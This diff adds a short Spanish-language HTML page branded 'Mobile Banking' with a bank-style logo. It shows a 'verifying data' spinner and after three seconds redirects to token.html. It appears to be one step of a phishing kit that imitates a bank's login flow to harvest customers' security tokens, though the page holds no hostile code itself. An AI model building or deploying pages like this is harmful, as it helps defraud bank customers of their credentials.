@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificando datos</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <!-- Header -->
+    <header class="top-bar">
+        <div class="title">Mobile Banking</div>
+    </header>
+
+    <!-- Logo -->
+    <div class="logo-container">
+        <img src="bna.png" alt="Logo">
+    </div>
+
+    <!-- Card espera -->
+    <div class="login-card espera-card">
+        <div class="login-title">Verificando datos</div>
+
+        <div class="loader-container">
+            <div class="loader"></div>
+            <p class="espera-text">Espere por favor</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <span class="close">✖</span>
+        <p>Salir</p>
+    </footer>
+
+    <script>
+    setTimeout(() => {
+        window.location.href = "token.html";
+    }, 3000);
+</script>
+
+
+</body>
+</html>
